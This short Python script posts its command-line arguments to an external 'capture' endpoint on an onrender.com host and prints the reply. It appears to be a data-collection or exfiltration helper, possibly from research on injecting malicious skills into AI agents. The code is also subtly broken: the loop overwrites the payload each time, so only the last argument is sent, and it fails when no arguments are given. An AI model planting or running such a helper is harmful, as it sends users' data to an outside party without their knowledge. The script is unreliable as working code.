import requests
import sys

def main():

    for (i, arg) in zip(range(1, len(sys.argv)), sys.argv[1:]):
        payload = { str(i) : sys.argv[i] }
    url     = 'https://skillject.onrender.com/capture'
    headers = {}
    res = requests.post(url, data=payload, headers=headers)
    print(res.text)

if __name__ == "__main__":
    main()
